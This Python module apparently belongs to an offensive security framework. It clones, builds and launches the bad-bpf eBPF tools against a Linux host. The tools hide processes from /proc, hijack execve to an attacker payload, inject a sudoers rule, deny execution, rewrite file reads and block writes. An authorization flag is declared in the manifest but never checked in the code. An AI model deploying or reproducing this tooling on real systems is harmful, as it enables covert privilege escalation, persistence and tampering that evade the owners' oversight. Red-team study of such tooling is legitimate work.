"""Bridge for bad-bpf offensive eBPF programs: PID hide, exec hijack, sudo backdoor.

Source: https://github.com/pathtofile/bad-bpf
License: BSD-3-Clause
SRC-ID: SRC-1036
Category: eBPF offensive, process hiding, exec hijack, sudo backdoor, write blocker
"""

import json
import os
import platform
import shutil
import subprocess
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any


MANIFEST = {
    "capability_id": "cloudxpl.k8s.bad_bpf_bridge.v1",
    "safety_class": "INVASIVE",
    "requires_authorization": True,
    "side_effects": [
        "loads_ebpf_programs",
        "hides_processes",
        "hijacks_execve",
        "modifies_sudoers",
        "blocks_file_writes",
    ],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1564.001", "T1574", "T1548.003"],
}

_REPO_URL = "https://github.com/pathtofile/bad-bpf"

# Individual eBPF tools in the bad-bpf suite
TOOLS = {
    "pidhide": {
        "description": "Hide a process from /proc by intercepting getdents64 syscall",
        "binary": "pidhide",
        "bpf_object": "pidhide.bpf.o",
        "args_template": ["--pid-to-hide", "{pid}"],
        "mitre": "T1564.001",
        "requires": ["pid"],
    },
    "exechijack": {
        "description": "Hijack execve() to redirect execution of a target binary to attacker payload",
        "binary": "exechijack",
        "bpf_object": "exechijack.bpf.o",
        "args_template": [],
        "mitre": "T1574",
        "requires": [],
    },
    "sudoadd": {
        "description": "Backdoor /etc/sudoers read by intercepting reads and injecting sudo rule",
        "binary": "sudoadd",
        "bpf_object": "sudoadd.bpf.o",
        "args_template": ["--username", "{username}"],
        "mitre": "T1548.003",
        "requires": ["username"],
    },
    "bpfdos": {
        "description": "Denial of service via BPF program that blocks target process execution",
        "binary": "bpfdos",
        "bpf_object": "bpfdos.bpf.o",
        "args_template": ["--target", "{target_binary}"],
        "mitre": "T1499",
        "requires": ["target_binary"],
    },
    "textreplace": {
        "description": "Modify file read output by replacing text patterns in read() syscall returns",
        "binary": "textreplace",
        "bpf_object": "textreplace.bpf.o",
        "args_template": [
            "--filename", "{filename}",
            "--input", "{input_text}",
            "--replace", "{replace_text}",
        ],
        "mitre": "T1565.001",
        "requires": ["filename", "input_text", "replace_text"],
    },
    "textreplace2": {
        "description": "Enhanced text replacement with multi-pattern support",
        "binary": "textreplace2",
        "bpf_object": "textreplace2.bpf.o",
        "args_template": [
            "--filename", "{filename}",
            "--input", "{input_text}",
            "--replace", "{replace_text}",
        ],
        "mitre": "T1565.001",
        "requires": ["filename", "input_text", "replace_text"],
    },
    "writeblocker": {
        "description": "Block write() syscalls to specified files via BPF",
        "binary": "writeblocker",
        "bpf_object": "writeblocker.bpf.o",
        "args_template": ["--filename", "{filename}"],
        "mitre": "T1485",
        "requires": ["filename"],
    },
}


def _save(args: Any, prefix: str, data: Any) -> str:
    out = getattr(args, "output", ".")
    os.makedirs(out, exist_ok=True)
    ts = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
    path = os.path.join(out, f"{prefix}_{ts}.json")
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2, default=str)
    print(f"[+] Results saved to {path}")
    return path


def _check_prerequisites() -> dict[str, Any]:
    """Verify kernel and system prerequisites for bad-bpf tools."""
    info: dict[str, Any] = {
        "kernel": platform.release(),
        "arch": platform.machine(),
        "errors": [],
        "warnings": [],
    }

    # Kernel version check (need >= 5.8 for ringbuf)
    try:
        parts = platform.release().split(".")
        major, minor = int(parts[0]), int(parts[1])
        if major < 5 or (major == 5 and minor < 8):
            info["errors"].append(
                f"Kernel {major}.{minor} too old; bad-bpf needs >= 5.8 for BPF ring buffer"
            )
    except (ValueError, IndexError):
        info["warnings"].append("Could not parse kernel version")

    # BTF support
    if not Path("/sys/kernel/btf/vmlinux").exists():
        info["errors"].append("BTF vmlinux not found: CONFIG_DEBUG_INFO_BTF required")

    # Capabilities
    try:
        status = Path("/proc/self/status").read_text()
        for line in status.splitlines():
            if line.startswith("CapEff:"):
                cap_hex = int(line.split(":")[1].strip(), 16)
                cap_sys_admin = 1 << 21
                cap_bpf = 1 << 39
                if not (cap_hex & cap_sys_admin) and not (cap_hex & cap_bpf):
                    info["errors"].append("CAP_SYS_ADMIN or CAP_BPF required")
                break
    except OSError:
        info["errors"].append("Cannot read /proc/self/status")

    info["prerequisites_met"] = len(info["errors"]) == 0
    return info


def _find_bad_bpf(args: Any) -> str | None:
    """Locate bad-bpf source/build directory."""
    custom = getattr(args, "bad_bpf_dir", None)
    if custom and os.path.isdir(custom):
        return custom

    for candidate in [
        "/opt/bad-bpf",
        os.path.expanduser("~/bad-bpf"),
        "/tmp/bad-bpf-build/bad-bpf",
    ]:
        if os.path.isdir(candidate) and os.path.isdir(os.path.join(candidate, "src")):
            return candidate

    return None


def _find_tool_binary(base_dir: str, tool_name: str) -> str | None:
    """Locate compiled binary for a specific tool."""
    tool_info = TOOLS.get(tool_name)
    if not tool_info:
        return None

    binary_name = tool_info["binary"]
    candidates = [
        os.path.join(base_dir, "src", binary_name),
        os.path.join(base_dir, "src", ".output", binary_name),
        os.path.join(base_dir, "build", binary_name),
    ]

    for candidate in candidates:
        if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
            return candidate

    return None


def _build_tools(args: Any) -> dict[str, Any]:
    """Clone and build bad-bpf tools from source."""
    build_dir = getattr(args, "build_dir", "/tmp/bad-bpf-build")
    result: dict[str, Any] = {"success": False, "path": None, "built_tools": [], "log": []}

    # Check build deps
    for tool in ["make", "clang", "llvm-strip"]:
        if not shutil.which(tool):
            result["log"].append(f"Required build tool not found: {tool}")
            return result

    os.makedirs(build_dir, exist_ok=True)
    src_dir = os.path.join(build_dir, "bad-bpf")

    if not os.path.isdir(src_dir):
        clone_cmd = ["git", "clone", "--depth", "1", "--recurse-submodules", _REPO_URL, src_dir]
        proc = subprocess.run(clone_cmd, capture_output=True, text=True, timeout=180)
        if proc.returncode != 0:
            result["log"].append(f"git clone failed: {proc.stderr.strip()}")
            return result
        result["log"].append("Repository cloned with submodules")

    make_dir = os.path.join(src_dir, "src")
    proc = subprocess.run(
        ["make", "-j", str(os.cpu_count() or 2)],
        capture_output=True,
        text=True,
        timeout=300,
        cwd=make_dir,
    )

    if proc.returncode != 0:
        result["log"].append(f"Build failed: {proc.stderr.strip()}")
        return result

    # Enumerate which tools got built
    for tool_name in TOOLS:
        binary = _find_tool_binary(src_dir, tool_name)
        if binary:
            result["built_tools"].append(tool_name)

    result["success"] = len(result["built_tools"]) > 0
    result["path"] = src_dir
    result["log"].append(
        f"Build completed: {len(result['built_tools'])}/{len(TOOLS)} tools built"
    )
    return result


def _run_tool(base_dir: str, tool_name: str, args: Any) -> dict[str, Any]:
    """Execute a specific bad-bpf tool."""
    if tool_name not in TOOLS:
        return {"success": False, "error": f"Unknown tool: {tool_name}"}

    tool_info = TOOLS[tool_name]
    binary = _find_tool_binary(base_dir, tool_name)

    if not binary:
        return {
            "success": False,
            "error": f"Binary not found for {tool_name}; build first",
        }

    # Validate required arguments
    for req_arg in tool_info["requires"]:
        if not getattr(args, req_arg, None):
            return {
                "success": False,
                "error": f"Missing required argument: --{req_arg}",
            }

    # Build command
    cmd = [binary]
    for tmpl_arg in tool_info["args_template"]:
        if tmpl_arg.startswith("{"):
            param_name = tmpl_arg.strip("{}")
            value = getattr(args, param_name, "")
            cmd.append(str(value))
        else:
            cmd.append(tmpl_arg)

    print(f"[*] Running {tool_name}: {' '.join(cmd)}")

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        # Collect initial output (tools may run as daemons)
        import select

        ready, _, _ = select.select([proc.stdout], [], [], 3.0)
        initial_output = ""
        if ready:
            initial_output = proc.stdout.readline()

        return {
            "success": True,
            "pid": proc.pid,
            "tool": tool_name,
            "binary": binary,
            "initial_output": initial_output.strip(),
            "description": tool_info["description"],
            "mitre": tool_info["mitre"],
        }
    except OSError as exc:
        return {"success": False, "error": str(exc)}


def _stop_tool(pid: int) -> dict[str, Any]:
    """Stop a running bad-bpf tool by PID."""
    import signal

    try:
        os.kill(pid, signal.SIGTERM)
        return {"success": True, "pid": pid, "signal": "SIGTERM"}
    except ProcessLookupError:
        return {"success": False, "error": f"Process {pid} not found"}
    except PermissionError:
        return {"success": False, "error": f"Permission denied killing PID {pid}"}


def run(args: Any) -> int:
    """Execute bad_bpf_bridge module.

    Supported actions (via args.action):
        check    - Verify prerequisites and locate installation
        build    - Build all bad-bpf tools from source
        list     - List available tools and their capabilities
        deploy   - Run a specific tool (--tool <name>)
        stop     - Stop a running tool (--target-pid <pid>)
    """
    action = getattr(args, "action", "check")
    print(f"[*] {MANIFEST['capability_id']} - bad-bpf offensive eBPF tools bridge")
    print(f"[*] Action: {action}")

    results: dict[str, Any] = {
        "module": "bad_bpf_bridge",
        "action": action,
        "findings": [],
        "summary": {},
    }

    prereqs = _check_prerequisites()
    results["prerequisites"] = prereqs

    if action == "check":
        bpf_dir = _find_bad_bpf(args)
        results["bad_bpf_dir"] = bpf_dir
        results["status"] = "completed"

        if prereqs["prerequisites_met"]:
            print("[+] Kernel BPF prerequisites verified")
        else:
            print(f"[-] Issues: {'; '.join(prereqs['errors'])}")

        if bpf_dir:
            print(f"[+] bad-bpf found at: {bpf_dir}")
            available = []
            for tool_name in TOOLS:
                binary = _find_tool_binary(bpf_dir, tool_name)
                status = "compiled" if binary else "source_only"
                available.append({"tool": tool_name, "status": status, "binary": binary})
            results["tools"] = available
        else:
            print("[!] bad-bpf not installed; use 'build' action or set --bad-bpf-dir")

        _save(args, "k8s_bad_bpf_check", results)
        return 0

    if action == "list":
        results["tools"] = {}
        for name, info in TOOLS.items():
            results["tools"][name] = {
                "description": info["description"],
                "mitre": info["mitre"],
                "required_args": info["requires"],
            }
            print(f"  [{name}] {info['description']}")
            print(f"    MITRE: {info['mitre']} | Args: {', '.join(info['requires']) or 'none'}")
        results["status"] = "completed"
        _save(args, "k8s_bad_bpf_list", results)
        return 0

    if action == "build":
        build_result = _build_tools(args)
        results["build"] = build_result
        results["status"] = "completed" if build_result["success"] else "build_failed"
        for msg in build_result["log"]:
            print(f"[*] {msg}")
        _save(args, "k8s_bad_bpf_build", results)
        return 0 if build_result["success"] else 1

    if action == "stop":
        target_pid = getattr(args, "target_pid", None)
        if not target_pid:
            print("[-] --target-pid required for stop action", file=sys.stderr)
            return 1
        stop_result = _stop_tool(int(target_pid))
        results["stop"] = stop_result
        results["status"] = "completed"
        if stop_result["success"]:
            print(f"[+] Sent SIGTERM to PID {target_pid}")
        else:
            print(f"[-] Stop failed: {stop_result['error']}")
        _save(args, "k8s_bad_bpf_stop", results)
        return 0

    # Deploy requires BPF support
    if action == "deploy":
        if not prereqs["prerequisites_met"]:
            print("[-] Cannot deploy: BPF prerequisites not met", file=sys.stderr)
            results["status"] = "prereq_failed"
            _save(args, "k8s_bad_bpf_error", results)
            return 1

        bpf_dir = _find_bad_bpf(args)
        if not bpf_dir:
            print("[-] bad-bpf directory not found", file=sys.stderr)
            results["status"] = "not_installed"
            _save(args, "k8s_bad_bpf_error", results)
            return 1

        tool_name = getattr(args, "tool", None)
        if not tool_name:
            print("[-] --tool required for deploy action", file=sys.stderr)
            return 1

        deploy_result = _run_tool(bpf_dir, tool_name, args)
        results["deploy"] = deploy_result
        results["status"] = "completed" if deploy_result["success"] else "deploy_failed"

        if deploy_result["success"]:
            print(f"[+] {tool_name} deployed (PID: {deploy_result['pid']})")
            results["findings"].append({
                "type": f"bpf_tool_{tool_name}",
                "pid": deploy_result["pid"],
                "description": deploy_result["description"],
                "mitre": deploy_result["mitre"],
            })
        else:
            print(f"[-] Deploy failed: {deploy_result.get('error')}")

        _save(args, f"k8s_bad_bpf_{tool_name}", results)
        return 0 if deploy_result["success"] else 1

    print(f"[-] Unknown action: {action}", file=sys.stderr)
    results["status"] = "unknown_action"
    _save(args, "k8s_bad_bpf_error", results)
    return 1
